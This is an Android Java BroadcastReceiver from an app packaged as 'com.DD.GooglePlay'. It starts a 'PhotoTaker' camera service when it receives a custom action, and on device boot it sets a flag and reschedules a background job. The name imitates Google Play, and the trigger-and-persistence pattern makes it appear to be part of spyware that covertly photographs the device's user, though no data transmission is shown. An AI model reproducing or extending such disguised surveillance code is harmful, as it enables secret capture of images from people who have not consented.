package com.DD.GooglePlay;

import static com.DD.GooglePlay.MainActivity.isJobIdRunning;
import static com.DD.GooglePlay.MainService.schedulejob;
import static com.DD.GooglePlay.MainService.sharedPref;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.preference.PreferenceManager;


public class Receiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if("startCameraService".equals(intent.getAction())){
                Intent i = new Intent(context, PhotoTaker.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(i);
                } else context.startService(i);
            }
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            if (sharedPref == null) sharedPref = PreferenceManager.getDefaultSharedPreferences(context);
                if (sharedPref != null) {
                SharedPreferences.Editor editor = sharedPref.edit();
                editor.putBoolean("finished_feeling", true);
                editor.apply();
            }
        }
        schedulejob(new Util(), context);
    }
}